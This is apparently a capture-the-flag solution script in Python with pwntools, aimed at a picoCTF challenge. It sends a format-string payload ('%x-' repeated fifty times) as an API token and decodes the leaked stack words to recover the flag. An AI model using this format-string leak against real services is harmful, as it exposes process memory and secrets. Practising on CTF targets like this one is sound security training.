from pwn import *

url = 'mercury.picoctf.net'
port = '59616'

r = remote(url, port)

r.recvuntil("View my portfolio")
r.sendline('1')
log.info("Viewing Portfolio...")
r.recvuntil("What is your API token?")
log.info("Sending String Portfolio...")
# FSB?
r.sendline('%x-' * 50)
log.info("Received data.. Parsing API key..")
r.recvuntil('Buying stonks with token:\n')
leak = r.recvline().decode("utf-8")
leak = leak.split('-')
print(leak)
flag = ""
for data in leak:
	try:
    # little
		data = bytearray.fromhex(data).decode()[::-1]
		flag += data
	except:
		continue

print(flag)